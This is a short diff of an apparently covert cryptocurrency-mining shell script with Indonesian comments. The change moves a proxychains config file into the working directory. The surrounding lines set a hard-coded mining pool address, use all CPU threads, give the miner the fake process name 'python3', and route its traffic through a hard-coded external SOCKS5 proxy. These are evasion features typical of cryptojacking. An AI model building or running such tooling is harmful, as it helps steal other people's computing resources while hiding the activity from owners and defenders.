@@ -7,6 +7,7 @@ POOL="stratum+tcp://159.223.48.143:443"
 ALGO="power2b"
 THREADS=$(nproc --all)
 FAKE_NAME="python3"
+CONFIG_PATH="./proxychains.conf"
 
 # ====[ CEK DEPENDENSI ]====
 command -v proxychains >/dev/null 2>&1 || {
@@ -14,8 +15,7 @@ command -v proxychains >/dev/null 2>&1 || {
     exit 1
 }
 
-# Setup SOCKS5 proxy config otomatis (127.0.0.1:9050 default)
-CONFIG_PATH="$HOME/.proxychains.conf"
+# Buat konfigurasi SOCKS5 lokal di direktori kerja
 echo -e "[ProxyList]\nsocks5 101.38.175.192 8081" > "$CONFIG_PATH"
 export PROXYCHAINS_CONF_FILE="$CONFIG_PATH"
 
